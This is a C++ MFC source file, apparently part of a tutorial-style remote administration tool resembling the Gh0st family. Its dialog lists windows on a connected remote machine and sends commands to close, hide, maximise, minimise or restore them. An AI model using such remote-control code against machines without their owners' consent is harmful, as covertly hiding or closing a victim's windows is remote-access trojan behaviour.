// CWindowsDlg.cpp: 实现文件
//

#include "pch.h"
#include "MyRemote.h"
#include "CWindowsDlg.h"
#include "afxdialogex.h"
#include "..\common\macros.h"

// CWindowsDlg 对话框

IMPLEMENT_DYNAMIC(CWindowsDlg, CDialog)

CWindowsDlg::CWindowsDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext* pContext)
	: CDialog(IDD_WINDOWS, pParent)
{
	m_iocpServer = pIOCPServer;        //就是一个赋值没什么特别的我们到oninitdialog
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_PROCESS));
	//这里判断是窗口管理还是进程管理因为进程管理的数据头是TOKEN_PSLIST
	//窗口管理的数据头TOKEN_WSLIST  我们可以用这两个数据头来区分
	char* lpBuffer = (char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(0));
	m_bHow = lpBuffer[0];
}

CWindowsDlg::~CWindowsDlg()
{
}

void CWindowsDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_WINDOWS, m_list_windows);
}


BEGIN_MESSAGE_MAP(CWindowsDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_LIST_WINDOWS, &CWindowsDlg::OnNMRClickListWindows)
	ON_COMMAND(ID_WINDOWS_CLOSE, &CWindowsDlg::OnWindowsClose)
	ON_COMMAND(ID_WINDOWS_HIDE, &CWindowsDlg::OnWindowsHide)
	ON_COMMAND(ID_WINDOWS_MAX, &CWindowsDlg::OnWindowsMax)
	ON_COMMAND(ID_WINDOWS_MIN, &CWindowsDlg::OnWindowsMin)
	ON_COMMAND(ID_WINDOWS_RETURN, &CWindowsDlg::OnWindowsReturn)
	ON_COMMAND(ID_WINDOWS_REFLUSH, &CWindowsDlg::OnWindowsReflush)
END_MESSAGE_MAP()


// CWindowsDlg 消息处理程序


void CWindowsDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	CDialog::OnClose();
}


void CWindowsDlg::AdjustList(void)
{
	if (m_list_windows.m_hWnd == NULL)
	{
		return;
	}
	RECT	rectClient;
	RECT	rectList;
	GetClientRect(&rectClient);
	rectList.left = 0;
	rectList.top = 0;
	rectList.right = rectClient.right;
	rectList.bottom = rectClient.bottom;

	m_list_windows.MoveWindow(&rectList);
}

void CWindowsDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
	AdjustList();
	// TODO: 在此处添加消息处理程序代码
}




BOOL CWindowsDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon


	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen); //得到连接的ip 
	str.Format("\\\\%s - 系统管理", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);//设置对话框标题


	if (m_bHow == TOKEN_WSLIST)//窗口管理初始化列表
	{
		m_list_windows.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);  //初始化 窗口管理的列表
		m_list_windows.InsertColumn(0, "PID", LVCFMT_LEFT, 50);
		m_list_windows.InsertColumn(1, "窗口名称", LVCFMT_LEFT, 300);
		m_list_windows.InsertColumn(2, "窗口状态", LVCFMT_LEFT, 300);
		ShowWindowsList();
	}
	AdjustList();       //各个列表的大小
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void CWindowsDlg::OnReceiveComplete(void)
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
		case TOKEN_WSLIST:
			ShowWindowsList();
			break;
		default:
			// 传输发生异常数据
			break;
		}
}


void CWindowsDlg::ShowWindowsList(void)
{
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	char* lpTitle = NULL;
	//m_list_process.DeleteAllItems();
	bool isDel = false;
	do
	{
		isDel = false;
		for (int j = 0; j < m_list_windows.GetItemCount(); j++)
		{
			CString temp = m_list_windows.GetItemText(j, 2);
			CString restr = "隐藏";
			if (temp != restr)
			{
				m_list_windows.DeleteItem(j);
				isDel = true;
				break;
			}
		}

	} while (isDel);
	CString	str;
	int i;
	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		lpTitle = (char*)lpBuffer + dwOffset + sizeof(DWORD);
		str.Format("%5u", *lpPID);
		m_list_windows.InsertItem(i, str);
		m_list_windows.SetItemText(i, 1, lpTitle);
		m_list_windows.SetItemText(i, 2, "显示"); //(d) 将窗口状态显示为 "显示"
		// ItemData 为窗口句柄
		m_list_windows.SetItemData(i, *lpPID);  //(d)
		dwOffset += sizeof(DWORD) + lstrlen(lpTitle) + 1;
	}
	str.Format("窗口名称 / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list_windows.SetColumn(1, &lvc);
}

void CWindowsDlg::OnNMRClickListWindows(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu	Menu;
	if (m_bHow == TOKEN_WSLIST)      //进程管理初始化列表
	{
		Menu.LoadMenu(IDR_MENU_WINDOWS);
	}
	CMenu* pMenu = Menu.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);

	pMenu->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);

	*pResult = 0;
}


void CWindowsDlg::OnWindowsClose()
{
	// TODO: 在此添加命令处理程序代码
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_list_windows;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_CLOSE;      //注意这个就是我们的数据头
		DWORD hwnd = pListCtrl->GetItemData(nItem); //得到窗口的句柄一同发送
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
	}
}


void CWindowsDlg::OnWindowsHide()
{
	// TODO: 在此添加命令处理程序代码
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_list_windows;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_TEST;       //窗口处理数据头
		DWORD hwnd = pListCtrl->GetItemData(nItem);  //得到窗口的句柄一同发送
		pListCtrl->SetItemText(nItem, 2, "隐藏");  //注意这时将列表中的显示状态为"隐藏"
		//这样在删除列表条目时就不删除该项了 如果删除该项窗口句柄会丢失 就永远也不能显示了
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));  //得到窗口的句柄一同发送
		DWORD dHow = SW_HIDE;               //窗口处理参数 0
		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));

	}
}


void CWindowsDlg::OnWindowsMax()
{
	// TODO: 在此添加命令处理程序代码
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_list_windows;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_TEST;     //同上
		DWORD hwnd = pListCtrl->GetItemData(nItem);  //同上
		pListCtrl->SetItemText(nItem, 2, "显示");   //将状态改为显示
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
		DWORD dHow = SW_MAXIMIZE;     //同上
		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));

	}
}




void CWindowsDlg::OnWindowsMin()
{
	// TODO: 在此添加命令处理程序代码
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_list_windows;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_TEST;
		DWORD hwnd = pListCtrl->GetItemData(nItem);
		pListCtrl->SetItemText(nItem, 2, "显示");
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
		DWORD dHow = SW_MINIMIZE;
		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));

	}
}



void CWindowsDlg::OnWindowsReturn()
{
	// TODO: 在此添加命令处理程序代码
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_list_windows;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_TEST;
		DWORD hwnd = pListCtrl->GetItemData(nItem);
		pListCtrl->SetItemText(nItem, 2, "显示");
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
		DWORD dHow = SW_RESTORE;
		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));

	}
}


void CWindowsDlg::OnWindowsReflush()
{
	// TODO: 在此添加命令处理程序代码
	GetWindowsList();
}

void CWindowsDlg::GetWindowsList(void)
{
	BYTE bToken = COMMAND_WSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}
